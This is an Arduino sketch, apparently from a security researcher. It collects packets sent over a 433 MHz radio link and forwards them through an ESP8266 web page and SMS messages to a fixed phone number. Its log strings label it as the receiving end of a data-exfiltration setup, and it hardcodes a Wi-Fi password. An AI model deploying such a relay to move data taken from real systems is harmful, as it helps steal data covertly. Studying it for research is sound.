/*
** MIT LICENSE
** Copyright <2020> <David Reguera Garcia aka Dreg> dreg@fr33project.org
** http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg
**
** Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
** associated documentation files (the "Software"), to deal in the Software without restriction,
** including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
** and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so,
** subject to the following conditions:
**
** The above copyright notice and this permission notice shall be included in all copies or substantial
** portions of the Software.
**
** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
** LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
** IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
** WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
** SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include <RH_ASK.h>    
#ifdef RH_HAVE_HARDWARE_SPI
#include <SPI.h> // Not actually used but needed to compile
#endif 

#include "DFRobot_sim808.h"
#include "ESP8266.h"

#define SSID "dregexf"
#define PASSWORD "dregsexy"
 
ESP8266 wifi(Serial2);

#define MYNUMBER "+346..."

#define DISPLAY_NUMBER 0 // replace with 1 if you want display the phone number 

#define SIM808_D9_PIN 4
#define SIM808_RST_PIN 3

#define BUTTON_PIN 2

DFRobot_SIM808 sim808(&Serial1);

RH_ASK rf;   // default RX pin 11

#define SIZE_STR_DF(str) (sizeof(str) - 1)

#pragma pack(1)

typedef struct pckt_rcv_s
{
  uint8_t id;
  uint8_t data[18];
} pckt_rcv_t;

#define MAX_SIZE_PCKS 0xAA
pckt_rcv_t pcks[MAX_SIZE_PCKS];
uint8_t last_pcks;
 
void setup(){
    pinMode(BUTTON_PIN, INPUT_PULLUP);
    pinMode(LED_BUILTIN, OUTPUT);
    pinMode(SIM808_D9_PIN, OUTPUT);
    pinMode(SIM808_RST_PIN, OUTPUT);
    
    Serial.begin(9600);
    while (!Serial) {}
    
    //Serial.println("\r\nwaiting packets....\r\n");
  
    rf.init();   
}

uint8_t buff[19];      
uint8_t sizz = sizeof(buff); 
uint8_t last_id;

void loop()
{
    sizz = sizeof(buff);
    last_id = 0;
    memset(buff, 0, sizeof(buff));
    do
    {
      if (rf.recv(buff, &sizz)) 
      {
        if (sizz != sizeof(buff))
        {
          Serial.print("\r\n\r\nERROR! size recv: ");
          Serial.println(sizz);
          Serial.println((char*) buff);
        }
        else
        {
          if (buff[0] != last_id)
          {
            Serial.write(buff, sizeof(buff));
            if (buff[0] - 1 != last_id)
            {
              Serial.println("\r\n\r\nERROR! NO ID CONTG, LOST PACKETS\r\n");
            }
            else
            {
              last_id = buff[0];
              memcpy(&(pcks[last_pcks]), buff, sizeof(buff));
              last_pcks++;
    
              if (last_pcks == MAX_SIZE_PCKS)
              {
                Serial.println("\r\n\r\nERROR OVERFLOW! MAX_SIZE_PCKS\r\n");
                last_pcks = 0;
                memset(pcks, 0, sizeof(pcks));
              }
            }
          }  
        } 
        sizz = sizeof(buff);
        memset(buff, 0, sizeof(buff));
      }
      else if (digitalRead(BUTTON_PIN) == LOW)
      {
          Serial.println("\r\nbutton pushed!!\r\n");
          esp01stf();
          sim808stf();
          Serial.println("\r\nend of exfill, reset me?\r\n");
          while (1) { };
      } 
    } while (1);
}

/*
void sim808reset(void)
{
  delay(500);
  digitalWrite(SIM808_RST_PIN, LOW);
  delay(500);
  digitalWrite(SIM808_RST_PIN, HIGH);
  delay(500);
}

void sim808poweron(void)
{
  delay(500);
  pinMode(SIM808_D9_PIN, OUTPUT);
  digitalWrite(SIM808_D9_PIN, HIGH);
  delay(3000);
  digitalWrite(SIM808_D9_PIN, LOW);
  delay(200);
}
*/

void sim808reinit(void)
{
  int j = 0;
  delay(500);
  Serial.print("reseting sim808... please wait, can be some errors tries, checkPowerUp: ");
  delay(500);
  sim808.powerReset(SIM808_RST_PIN);
  delay(500);
  sim808.powerUpDown(SIM808_D9_PIN);
  delay(500);
  if (sim808.checkPowerUp())
  {
    delay(500);
    Serial.println("UP");
    sim808.powerUpDown(SIM808_D9_PIN);
    delay(500);
    sim808.powerUpDown(SIM808_D9_PIN);
  }
  else
  {
    delay(500);
    Serial.println("DOWN");
    sim808.powerUpDown(SIM808_D9_PIN);
    delay(500);
  }

  while(!sim808.init()) 
  { 
    delay(1000);
    Serial.println("Sim808 init error, please wait, trying again...\r\n");
    Serial.println(j);
    if (j++ > 8)
    {
      sim808.powerUpDown(SIM808_D9_PIN);
      j = 0;
    }
  }
  delay(1000);  
  Serial.println("Sim808 init success");
}

void sim808stf() 
{
  char smstext[20];
  //Serial.begin(19200);
  Serial1.begin(19200);
  delay(1000);
  Serial.println("starting.... please wait...");
  
  sim808reinit();
  
  Serial.print("sending sms to: ");
  if (DISPLAY_NUMBER == 1)
  {
      Serial.println(MYNUMBER);
  }
  else
  {
      Serial.println("*CENSORED");
  }


  if (last_pcks != 0)
  {
    for (uint8_t p = 0; p < last_pcks; p++)
    {
      memset(smstext, 0, sizeof(smstext));
      memcpy(smstext, ((uint8_t*)&(pcks[p])) + 1, 18);
      sim808.sendSMS(MYNUMBER, smstext);
      Serial.print("sended sms: ");
      Serial.print(p + 1);
      Serial.print(" - content: ");
      Serial.println(smstext);
      delay(5000);
    }
  }
  else
  {
    Serial.println("ERROR, NO PACKETS TO SEND VIA SMS");
  }
          
  //sim808.sendSMS(MYNUMBER, "aa");
  //sim808reinit();
  delay(5000);
}

void esp01stf(void)
{
   //Serial.begin(115200);
   Serial2.begin(115200);
   delay(2000);
   
   Serial.print("setup begin\r\n");
   
   wifi.restart();
   delay(500);
 
   if (wifi.setOprToStationSoftAP()) {
      Serial.print("to station + softap ok\r\n");
   }
   else {
      Serial.print("to station + softap err\r\n");
   }
 
   if (wifi.setSoftAPParam(SSID, PASSWORD)) {
      Serial.print("AP mode success\r\n");
      Serial.print("IP: ");
      Serial.println(wifi.getLocalIP().c_str());
   }
   else {
      Serial.print("AP failure\r\n");
   }
 
   if (wifi.enableMUX()) {
      Serial.print("multiple ok\r\n");
   }
   else {
      Serial.print("multiple err\r\n");
   }
 
   if (wifi.startTCPServer(80)) {
      Serial.print("start tcp server ok\r\n");
   }
   else {
      Serial.print("start tcp server err\r\n");
   }
 
   if (wifi.setTCPServerTimeout(180)) {
      Serial.print("set tcp server timout 10 seconds\r\n");
   }
   else {
      Serial.print("set tcp server timout err\r\n");
   }
 
   Serial.println("setup end\r\n");

   uint8_t buffer[128] = { 0 };
   uint8_t mux_id;

   loopf:
   
    if (digitalRead(BUTTON_PIN) == LOW)
    {
      return;
    }
      
   uint32_t len = wifi.recv(&mux_id, buffer, sizeof(buffer), 100);
   if (len > 0) 
   {
      if (digitalRead(BUTTON_PIN) == LOW)
      {
        return;
      }
      Serial.print("Received from: ");
      Serial.print(mux_id);
      Serial.print("\r\n");

      #define STRCN_1 "HTTP/1.1 200 OK\r\nnContent-Type: /html\r\nConnection: close\r\n\r\n"
      #define STRCN_2 "<html>\n<head>\n<title>Dreg exfweb, slow web, be patient</title>\n</head>\n<body>"
      #define STRCN_3 "<h1>Dreg exfweb, slow web, be patient</h1>"
      #define STRCN_4 "<h2>built in led</h2>"
      #define STRCN_5 "<button onClick=location.href='./?data=0'>on</button><br><br>"
      #define STRCN_6 "<button onClick=location.href='./?data=1'>off</button><br><br>"
      #define STRCN_7 "<button onClick=location.href='./?data=2'>toggle</button><br><br><hr><br><br>"
      #define STRCN_8 "<button onClick=location.href='./?data=3'>close esp01 and send SMS</button><br><br><hr><br><br>"
      #define STRCN_9 "</body></html>"
      #define STRCN_10 "NO INFO TO EXF<br><br>"
      #define STRCN_11 "SUCCESS - INFO TO EXF<br><br>"
           
      wifi.send(mux_id, (uint8_t*) STRCN_1, SIZE_STR_DF(STRCN_1));
      wifi.send(mux_id, (uint8_t*) STRCN_2, SIZE_STR_DF(STRCN_2));
      wifi.send(mux_id, (uint8_t*) STRCN_3, SIZE_STR_DF(STRCN_3));
      wifi.send(mux_id, (uint8_t*) STRCN_4, SIZE_STR_DF(STRCN_4));
      wifi.send(mux_id, (uint8_t*) STRCN_5, SIZE_STR_DF(STRCN_5));
      wifi.send(mux_id, (uint8_t*) STRCN_6, SIZE_STR_DF(STRCN_6));
      wifi.send(mux_id, (uint8_t*) STRCN_7, SIZE_STR_DF(STRCN_7));
      wifi.send(mux_id, (uint8_t*) STRCN_8, SIZE_STR_DF(STRCN_8));

      if (last_pcks == 0)
      {
        wifi.send(mux_id, (uint8_t*) STRCN_10, SIZE_STR_DF(STRCN_10));
      }
      else
      {
        wifi.send(mux_id, (uint8_t*) STRCN_11, SIZE_STR_DF(STRCN_11));
        for (uint8_t p = 0; p < last_pcks; p++)
        {
          if (wifi.send(mux_id, ((uint8_t*)&(pcks[p])) + 1, sizeof(pcks[p]) - 1))
          {
            //Serial.println("\r\nSUCCESS SENDING pcks\n\n");
          }
          else
          {
            Serial.println("\r\nERROR!! SENDING pcks\n\n");
            break;
          }
        }
      }
      
      
    
      wifi.send(mux_id, (uint8_t*) STRCN_9, SIZE_STR_DF(STRCN_9));

      Serial.println("send finish");
 
      for (uint32_t i = 0; i < len; i++) 
      {
         char c = (char)buffer[i];
         if (c == '?')
         {
            switch ((char)buffer[i + 6])
            {
               case '0':
                  digitalWrite(LED_BUILTIN, HIGH);
                  Serial.println("LED_BUILTIN on");
               break;

               case '1':
                   digitalWrite(LED_BUILTIN, LOW);
                   Serial.println("LED_BUILTIN off");
               break;
               
               case '2':
                   digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
                   Serial.print("LED_BUILTIN toggle, now: ");
                   Serial.println(digitalRead(LED_BUILTIN) ? "on" : "off");
               break;

               case '3':
                    Serial.println("\r\nclosing esp-01 and sending sms....\r\n");
                   return;
               break;

               default:
               break;

            }
            break;
         }
      }
   }
   goto loopf;
}
